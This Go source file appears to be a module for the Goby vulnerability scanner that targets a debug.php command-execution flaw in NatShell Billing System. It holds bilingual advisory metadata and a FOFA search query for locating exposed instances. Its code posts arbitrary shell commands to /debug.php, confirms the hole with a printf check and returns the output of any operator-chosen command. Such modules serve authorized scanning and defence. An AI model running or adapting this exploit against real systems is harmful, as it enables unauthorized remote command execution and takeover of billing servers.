package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "NatShell Billing System Debug RCE",
    "Description": "NatShell Billing System has a debug.php script, that allow to execute command.",
    "Impact": "NatShell Billing System Debug RCE",
    "Recommendation": "delete debug.php file",
    "Product": "NatShell Billing System",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "蓝海卓越计费管理系统 debug.php 命令执行漏洞",
            "Description": "<p>蓝海卓越认证计费管理系统是一套以实现网络运营为基础，增强全局安全为中心，提高管理效率为目的的网络安全运营管理系统。</p><br><p>蓝海卓越计费管理系统 debug.php 存在命令调试页面，导致攻击者可以远程命令执行。</p>",
            "Impact": "<p>蓝海卓越计费管理系统 debug.php 存在命令调试页面，黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：</span><a href=\"http://skymin.qy6.com/getprod1185228.html\" rel=\"nofollow\">http://skymin.qy6.com/getprod1185228.html</a><br></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "蓝海卓越计费管理系统",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NatShell Billing System Debug RCE",
            "Description": "NatShell Billing System has a debug.php script, that allow to execute command.",
            "Impact": "NatShell Billing System Debug RCE",
            "Recommendation": "delete debug.php file",
            "Product": "NatShell Billing System",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"蓝海卓越计费管理系统\"",
    "GobyQuery": "title=\"蓝海卓越计费管理系统\"",
    "Author": "ovi3",
    "Homepage": "https://www.natshell.com/",
    "DisclosureDate": "2021-05-19",
    "References": [
        "https://mp.weixin.qq.com/s/CVe7GSRzCKcYXj5Pj8W5SA"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.3",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10194"
}`

	execCmd := func(u *httpclient.FixUrl, cmd string) (string, error) {
		cfg := httpclient.NewPostRequestConfig("/debug.php")
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "cmd=" + url.QueryEscape(cmd)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody, nil
		} else {
			return "", err
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand.Seed(time.Now().UnixNano())
			rand1 := 40000 + rand.Intn(4800)
			rand2 := 40000 + rand.Intn(4800)
			cmd := fmt.Sprintf(`printf %d%%%%%d`, rand1, rand2)
			if content, err := execCmd(u, cmd); err == nil {
				if strings.Contains(content, fmt.Sprintf(`%d%%%d`, rand1, rand2)) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if content, err := execCmd(expResult.HostInfo, ss.Params["cmd"].(string)); err == nil {
				expResult.Success = true
				expResult.Output = content
			}
			return expResult
		},
	))
}
